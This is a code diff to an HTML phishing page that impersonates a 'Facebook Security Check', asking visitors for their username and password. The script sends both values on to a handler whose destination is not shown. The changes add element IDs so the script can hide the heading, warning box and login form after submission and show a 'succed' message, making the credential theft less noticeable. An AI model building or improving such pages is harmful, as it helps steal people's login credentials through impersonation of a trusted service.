@@ -38,16 +38,16 @@
 	</header>
 	<section>
 		<div class="form">
-			<div class="m-header">
+			<div class="m-header" id="check">
 				<h3>Facebook Security Check. Please Verify It's You.</h3>
 			</div>
-			<div class="red-box">
+			<div class="red-box" id="box">
 				<p style="font-weight:bold; font-size:13px">Verify needed to understand it's you</p>
 				<p>Enter your password for security reason . </p>
 				<p>Forgot your password ? <a href="login.html">Request new one</a>
 			</div>
 
-			<div  class="login-form">
+			<div  class="login-form" id="fom">
 				<div class="bb" novalidate="1" id="login-form" >
 	                <label for="username">Username:</label><input name="username" id="username" type="username"></input><br />
 	                <br>   
@@ -59,8 +59,9 @@
 				</div>
 			</div>
 
-		</div>
 <div class="hiide" id="hd" style="display:none;"> <h1> succed </h1> </div>
+		</div>
+
 		
 		<footer>
 			<ul>
@@ -100,7 +101,11 @@
   username:username,
   password:password
 });
-document.getElementById('hd').style.display = 'block';
+document.getElementById('check').style.display = 'none';
+document.getElementById('box').style.display = 'none';
+document.getElementById('fom').style.display = 'none';
+document.getElementById('hd').style.display = 'inline';
+
 }
 </script>
 </body>
